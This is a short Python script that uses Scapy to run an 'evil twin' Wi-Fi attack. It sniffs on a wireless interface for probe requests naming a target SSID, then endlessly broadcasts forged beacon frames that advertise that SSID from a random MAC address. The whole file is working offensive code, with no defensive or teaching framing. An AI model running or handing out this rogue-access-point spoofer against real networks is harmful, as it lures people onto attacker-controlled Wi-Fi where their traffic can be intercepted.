import argparse

from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, RadioTap, Dot11


parser = argparse.ArgumentParser()

parser.add_argument("--ssid", required=True, type=str, help="SSID to look up")
parser.add_argument("--interface", required=True, help="Interface to use")

args = parser.parse_args()

ssid = args.ssid
interface = args.interface


def handle(pack):
    if pack.type == 0 and pack.subtype == 4:
        if pack.info.decode() == ssid:
            evilTwin()


def evilTwin():
    fake_mac = RandMAC()
    evil_twin = RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2=fake_mac,
                                   addr3=fake_mac) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid)
    while True:
        sendp(evil_twin, iface=interface, verbose=True)


a = sniff(iface=interface, prn=handle)
